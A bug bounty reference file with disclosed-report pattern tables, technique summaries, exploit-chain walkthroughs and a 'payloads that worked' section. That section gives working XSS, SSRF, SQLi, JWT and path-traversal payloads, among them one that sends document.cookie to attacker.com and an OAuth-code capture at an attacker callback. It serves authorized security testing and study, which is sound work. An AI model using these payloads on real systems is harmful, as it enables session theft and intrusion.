# Bug Bounty Knowledge Base

Learnings from disclosed reports, articles, and real-world findings. Use this as reference before hunting.

---

## DISCLOSED REPORT PATTERNS

### HackerOne Disclosed Reports (High-Value Patterns)

#### IDOR Patterns
| Program | Bug | Root Cause | Payout | Lesson |
|---------|-----|------------|--------|--------|
| Uber | IDOR in ride history | No ownership check on /api/v1/rides/{id} | $10,000 | Always check if endpoint validates resource ownership |
| Coinbase | IDOR in account recovery | Sequential user IDs in reset flow | $25,000 | Test all HTTP methods, not just GET |
| Shopify | IDOR in store exports | Missing auth on /admin/export/{id} | $8,000 | Check admin endpoints for auth consistency |
| GitLab | IDOR in project import | No ownership validation on import tokens | $5,000 | Import/export features often skip auth |
| Yahoo | IDOR in contact deletion | DELETE endpoint missing ownership check | $2,500 | Test destructive operations carefully |

#### Auth Bypass Patterns
| Program | Bug | Root Cause | Payout | Lesson |
|---------|-----|------------|--------|--------|
| Uber | JWT algorithm confusion | RS256→HS256 attack | $15,000 | Always test JWT algorithm changes |
| Snapchat | OAuth token theft via redirect | Open redirect in OAuth flow | $7,500 | Chain open redirect with OAuth for ATO |
| GitLab | 2FA bypass via API | API endpoint skipped 2FA check | $10,000 | Mobile/API often have different auth paths |
| Slack | Session fixation | Session not regenerated after login | $4,000 | Test session handling across login flow |
| HackerOne | Password reset poisoning | Host header used in reset link | $3,000 | Always test Host/X-Forwarded-Host injection |

#### SSRF Patterns
| Program | Bug | Root Cause | Payout | Lesson |
|---------|-----|------------|--------|--------|
| GitLab | SSRF via webhook URL | No validation on webhook destination | $20,000 | Webhooks = SSRF goldmine |
| HackerOne | SSRF via file import | URL fetched during document import | $15,000 | Import from URL features always SSRF |
| Shopify | SSRF via avatar URL | Profile picture URL not validated | $10,000 | Test all URL input fields |
| PortSwigger | SSRF via PDF generator | HTML-to-PDF conversion fetches internal URLs | $12,000 | PDF generators often SSRF |
| Uber | SSRF via link preview | URL preview fetched server-side | $5,000 | Link preview = SSRF |

#### XSS Patterns
| Program | Bug | Root Cause | Payout | Lesson |
|---------|-----|------------|--------|--------|
| Shopify | Stored XSS in product description | No sanitization on HTML fields | $8,000 | Test all rich text inputs |
| HackerOne | DOM XSS via URL fragment | Location.hash reflected in innerHTML | $5,000 | Check all DOM sinks |
| GitLab | XSS in markdown rendering | Markdown parser allows script tags | $6,000 | Markdown rendering = XSS risk |
| Slack | XSS via custom emoji name | Emoji name not sanitized | $3,000 | Test all custom naming fields |
| Yahoo | XSS in search parameter | Search query reflected without encoding | $2,500 | Test search/reflection points |

#### Race Condition Patterns
| Program | Bug | Root Cause | Payout | Lesson |
|---------|-----|------------|--------|--------|
| HackerOne | Double-spend via race | TOCTOU in credit redemption | $10,000 | Test concurrent requests on financial ops |
| Shopify | Coupon race condition | No atomic check-deduct | $8,000 | Coupon/promo = race target |
| GitLab | Race in file upload | Multiple uploads bypass size limit | $4,000 | Upload features often raceable |
| Uber | Race in fare calculation | Price lock not atomic | $6,000 | Financial calculations = race window |
| PayPal | Race in payment processing | Double-submit race | $15,000 | Payment flows always race-test |

#### Business Logic Patterns
| Program | Bug | Root Cause | Payout | Lesson |
|---------|-----|------------|--------|--------|
| Uber | Price manipulation | Negative distance in fare calculation | $12,000 | Test negative values in all fields |
| Shopify | Discount stacking | No limit on coupon combinations | $10,000 | Test discount/coupon stacking |
| GitLab | Feature bypass | Feature flag check client-side only | $8,000 | Client-side checks = bypassable |
| HackerOne | Workflow skip | Step validation missing | $5,000 | Test skipping steps in multi-step flows |
| Bitcoin | Decimal precision | Division before multiplication | $20,000 | Test edge cases in math operations |

---

## TECHNIQUE PATTERNS FROM ARTICLES

### PortSwigger Research (James Kettle)

#### HTTP Request Smuggling
```
1. CL.TE: Content-Length (frontend) vs Transfer-Encoding (backend)
2. TE.CL: Transfer-Encoding (frontend) vs Content-Length (backend)
3. H2.CL: HTTP/2 downgrade smuggling
4. TE obfuscation: xchunked, tab prefix, space prefix
Impact: Cache poisoning, XSS at scale, credential theft
```

#### Web Cache Poisoning
```
1. Find unkeyed headers (X-Forwarded-Host, X-Original-URL)
2. Inject malicious payload in unkeyed header
3. Cache serves poisoned response to all users
Impact: XSS at scale, credential theft, malware distribution
```

#### Prototype Pollution
```
1. Find merge/extend functions without protection
2. Inject __proto__ parameter with malicious properties
3. Pollution leads to XSS or RCE
Impact: XSS, RCE on Node.js applications
```

### PortSwigger Research (Albinowax)

#### SSRF Bypass Techniques
```
1. DNS rebinding: First check = external, fetch = internal
2. Redirect chain: Follow redirects to bypass URL filters
3. Protocol smuggling: gopher://, dict://, file://
4. IP obfuscation: Decimal, hex, octal, IPv6
5. URL parser confusion: Different parsers parse differently
Impact: Internal network access, cloud metadata, RCE
```

#### OAuth Attacks
```
1. Missing state parameter = CSRF on OAuth
2. Open redirect in redirect_uri = ATO
3. PKCE bypass = code theft
4. Implicit flow = token leakage in referrer
Impact: Account takeover via OAuth code interception
```

### Academic Research

#### SQL Injection (SQLMap Patterns)
```
1. Error-based: Divide by zero reveals SQL structure
2. Blind: Time-based confirmation (SLEEP, WAITFOR)
3. Union-based: Determine column count
4. Stacked queries: Execute multiple statements
5. Out-of-band: DNS/HTTP exfiltration
Impact: Data exfiltration, authentication bypass, RCE
```

#### Deserialization Attacks
```
1. Java: ysoserial gadget chains (CommonsCollections, Spring)
2. PHP: phpggc tool (Laravel, Symfony, Monolog)
3. Python: pickle RCE payloads
4. Ruby: Marshal.load RCE
5. .NET: Json.net, BinaryFormatter
Impact: Remote code execution
```

---

## REAL EXPLOIT CHAINS

### Chain 1: Recon → Path Traversal → Credential Leak → RCE ($40K)
```
1. Subdomain returns 404 (most hunters skip)
2. Fuzz paths → /admin/ discovered
3. /download/ endpoint found (empty 200 response)
4. Fuzz for parameters → filename parameter discovered
5. Limited path traversal → /WEB-INF/web.xml disclosed
6. web.xml reveals /incident-report endpoint
7. Real-time log download → admin credentials found
8. Login with credentials → Groovy console access
9. Groovy console executes commands but no output
10. Chain: download fresh logs → RCE output found
Impact: Full server takeover
Lesson: Never stop at first bug, chain low-severity findings
```

### Chain 2: JWT Manipulation → Auth Bypass → File Overwrite ($23K)
```
1. JWT realm manipulation = admin panel UI access ($3K)
2. Severity downgraded (UI only, no API access)
3. Don't give up, keep digging
4. Found /upload endpoint (403 response)
5. Bearer removal bypass = full admin API access
6. File upload to S3 with destination parameter
7. Arbitrary file overwrite on CloudFront
8. Can modify JS/HTML/EXE/PDF served via CloudFront
9. RCE on user machines via malicious EXE/PDF
Impact: Full compromise of all users
Lesson: Never give up when severity is downgraded
```

### Chain 3: IDOR → Privilege Escalation → Data Exfil ($15K)
```
1. Regular user endpoint: GET /api/v1/users/{id}/profile
2. Change user_id to admin ID → IDOR found
3. Admin profile contains API keys
4. Use API keys to access admin endpoints
5. Admin endpoints expose all user data
6. Data exfil of 100K+ user records
Impact: Mass data breach
Lesson: IDOR + admin = critical chain
```

### Chain 4: Open Redirect → OAuth Theft → ATO ($10K)
```
1. Found open redirect: /redirect?url=evil.com
2. OAuth flow uses redirect parameter
3. Craft: /redirect?url=https://attacker.com/callback
4. Victim clicks link → redirected to attacker
5. OAuth code captured at attacker callback
6. Exchange code for access token
7. Full account takeover
Impact: Complete account compromise
Lesson: Open redirect alone = low, with OAuth = critical
```

### Chain 5: SSRF → Cloud Metadata → RCE ($25K)
```
1. Found SSRF in webhook URL parameter
2. Test cloud metadata: http://169.254.169.254/latest/meta-data/
3. Metadata accessible → IAM credentials found
4. Use IAM credentials to access S3
5. S3 contains application source code
6. Source code reveals database credentials
7. Database contains user password hashes
8. Crack hashes → admin password found
9. Full infrastructure compromise
Impact: Complete cloud infrastructure takeover
Lesson: SSRF → cloud metadata = critical chain
```

---

## PAYLOADS THAT WORKED

### XSS Payloads (from disclosed reports)
```javascript
// Polyglot (works in multiple contexts)
'-prompt.call(window,%20'xss_found")-

// CSP bypass
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">

// Angular template injection
{{constructor.constructor('alert(1)')()}}

// mXSS (mutation-based)
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// Event handler bypass
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

### SSRF Payloads (from disclosed reports)
```bash
# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Internal services
http://localhost:6379      # Redis
http://localhost:9200      # Elasticsearch
http://localhost:2375      # Docker API

# IP obfuscation
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://0x7f.0x0.0x0.0x1   # hex
http://127.1               # short form
http://[::1]               # IPv6
```

### SQLi Payloads (from disclosed reports)
```sql
' OR '1'='1
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
' AND 1=dbms_pipe.receive_message('a',5)--
```

### JWT Attack Payloads (from disclosed reports)
```python
# None algorithm
header = {"alg": "none", "typ": "JWT"}

# RS256 → HS256 confusion
token = jwt.encode(payload, public_key, algorithm="HS256")

# Realm manipulation
{"realm": "admin"}  # Change from "user" to "admin"
```

### Path Traversal Payloads (from disclosed reports)
```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
/etc/passwd%00.jpg
/WEB-INF/web.xml
```

---

## LESSONS FROM TOP HUNTERS

### @albinowax (PortSwigger)
> "The most impactful bugs come from understanding how the application processes input at each layer. Don't just test the endpoint — test the entire request lifecycle."

### @filedescriptor
> "Prototype pollution is everywhere in Node.js. If you find a merge function without protection, you're one step away from XSS or RCE."

### @orange_8361
> "The best bugs are found when you understand the developer's intent better than they do. Think about what shortcuts they took."

### @jaborratti
> "Don't just run tools. Understand what each tool does and why it's looking for specific patterns. Manual testing finds what automation misses."

### @zseano
> "Business logic bugs are the most underrated vulnerability class. They don't show up in scans, but they pay the most."

### @steventoth
> "Chaining low-severity bugs is the key to finding critical vulnerabilities. One bug alone may be nothing, but combine them and you have gold."

---

## COMMON MISTAKES TO AVOID

### 1. Not Reading Scope
```
WRONG: Start testing without reading scope
RIGHT: Read every in-scope asset, note out-of-scope items
```

### 2. Reporting Theoretical Bugs
```
WRONG: "Could potentially allow..."
RIGHT: "Attacker can do X resulting in Y" (with PoC)
```

### 3. Stopping at First Bug
```
WRONG: Find path traversal, report immediately
RIGHT: Find path traversal, chain with credential leak, report RCE
```

### 4. Ignoring 404 Responses
```
WRONG: 404 = not found, move on
RIGHT: 404 on subdomain may have active services, fuzz paths
```

### 5. Not Testing POST Methods
```
WRONG: ffuf defaults to GET, only test GET
RIGHT: Test POST, PUT, DELETE methods too
```

### 6. Reporting Low-Severity Findings Alone
```
WRONG: Report clickjacking on login page
RIGHT: Chain clickjacking with OAuth for account linking = Critical
```

### 7. Not Reading JavaScript Files
```
WRONG: Skip JS files, they're just frontend code
RIGHT: Read JS files thoroughly, they reveal endpoints and logic
```

### 8. Giving Up When Downgraded
```
WRONG: Severity downgraded, give up
RIGHT: Severity downgraded means you're close, dig deeper
```

---

## QUICK REFERENCE

### When to Use Each Tool
| Situation | Tool |
|-----------|------|
| Subdomain enumeration | subfaster, assetfinder, amass |
| Live host detection | httpx, dnsx |
| Directory fuzzing | ffuf, gobuster |
| Parameter discovery | arjun, paramspider |
| JS analysis | SecretFinder, jsluice |
| SQL injection | sqlmap |
| XSS scanning | dalfox, XSStrike |
| SSRF testing | interactsh, collaborator |
| Secret scanning | trufflehog, gitleaks |
| Nuclei templates | nuclei |

### Priority Checklist
```
[ ] Read scope and disclosed reports
[ ] Create temp emails for multi-account testing
[ ] Enumerate subdomains
[ ] Filter unique subdomains
[ ] Fuzz directories and parameters
[ ] Read JavaScript files
[ ] Test authentication flows
[ ] Test IDOR with two accounts
[ ] Test SSRF in all URL inputs
[ ] Chain low-severity findings
[ ] Write clear report with PoC
```
